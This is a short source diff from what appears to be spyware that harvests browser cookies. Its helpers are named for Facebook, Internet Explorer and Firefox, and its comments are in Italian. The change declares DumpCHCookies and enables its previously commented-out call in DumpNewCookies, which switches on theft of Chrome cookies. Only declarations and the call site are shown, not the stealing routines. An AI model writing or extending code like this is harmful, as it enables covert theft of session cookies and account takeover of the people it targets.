@@ -16,6 +16,7 @@
 extern DWORD HandleFaceBook(char *); // Handler per FaceBook
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(void); // Cookie per IExplorer
+extern int DumpCHCookies(void); // Cookie per Chrome
 
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 extern BOOL IsCrisisNetwork();
@@ -94,7 +95,7 @@ void DumpNewCookies()
 	ResetNewCookie();
 	DumpIECookies();
 	DumpFFCookies();
-	//DumpCHCookies(); // XXX
+	DumpCHCookies();
 }
 
 void CheckProcessStatus()
